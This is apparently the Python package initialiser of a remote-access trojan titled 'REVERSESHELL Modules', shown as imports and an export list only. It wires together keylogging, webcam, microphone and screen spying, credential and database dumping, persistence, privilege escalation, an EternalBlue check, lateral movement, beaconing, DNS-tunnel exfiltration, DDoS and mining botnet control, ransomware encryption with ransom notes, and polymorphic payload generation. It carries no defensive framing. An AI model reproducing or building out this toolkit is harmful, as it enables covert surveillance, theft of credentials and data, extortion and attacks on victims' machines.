# REVERSESHELL Modules
from .screenshot import capture_screenshot, start_screenshot_daemon
from .keylogger import start_keylogger, get_keylog, stop_keylogger
from .webcam import capture_webcam, capture_webcam_video, list_cameras
from .microphone import record_audio, list_audio_devices
from .geolocation import get_geolocation, get_network_info
from .persistence import install_persistence, PersistenceManager
from .proxy import proxy_manager, check_proxychains
from .cve_exploits import quick_scan, check_eternalblue, CVEExploits
from .credentials import dump_credentials, CredentialDumper
from .privesc import scan_privesc, PrivilegeEscalation
from .portforward import forward_port, start_socks
from .sniffer import sniff_packets, get_network_info as get_sniffer_info
from .lateral import enumerate_network, ssh_lateral, LateralMovement
from .clipboard import get_clipboard, start_clipboard_monitor, get_clipboard_history
from .screenrecord import capture_screen, record_screen, ScreenRecorder
from .beacon import start_beacon, get_beacon_status, Beacon
from .deaddrop import create_dead_drop, read_dead_drop, DeadDrop
from .botnet import start_ddos, start_mining, BotnetController
from .ransomware import encrypt_files, create_ransom_note, Ransomware
from .notifications import get_notifications, get_active_window
from .email import harvest_emails, EmailHarvester
from .database import dump_databases, find_database_files, DatabaseDumper
from .dns_tunnel import send_dns_data, exfiltrate_file_dns, DNSTunnel
from .polymorphic import generate_payload, generate_one_liner, PolymorphicPayload

__all__ = [
    # Core modules
    'capture_screenshot', 'start_screenshot_daemon',
    'start_keylogger', 'get_keylog', 'stop_keylogger',
    'capture_webcam', 'capture_webcam_video', 'list_cameras',
    'record_audio', 'list_audio_devices',
    'get_geolocation', 'get_network_info',
    'install_persistence', 'PersistenceManager',
    'proxy_manager', 'check_proxychains',
    'quick_scan', 'check_eternalblue', 'CVEExploits',
    
    # New modules
    'dump_credentials', 'CredentialDumper',
    'scan_privesc', 'PrivilegeEscalation',
    'forward_port', 'start_socks',
    'sniff_packets', 'get_sniffer_info',
    'enumerate_network', 'ssh_lateral', 'LateralMovement',
    'get_clipboard', 'start_clipboard_monitor', 'get_clipboard_history',
    'capture_screen', 'record_screen', 'ScreenRecorder',
    'start_beacon', 'get_beacon_status', 'Beacon',
    'create_dead_drop', 'read_dead_drop', 'DeadDrop',
    'start_ddos', 'start_mining', 'BotnetController',
    'encrypt_files', 'create_ransom_note', 'Ransomware',
    'get_notifications', 'get_active_window',
    'harvest_emails', 'EmailHarvester',
    'dump_databases', 'find_database_files', 'DatabaseDumper',
    'send_dns_data', 'exfiltrate_file_dns', 'DNSTunnel',
    'generate_payload', 'generate_one_liner', 'PolymorphicPayload',
]
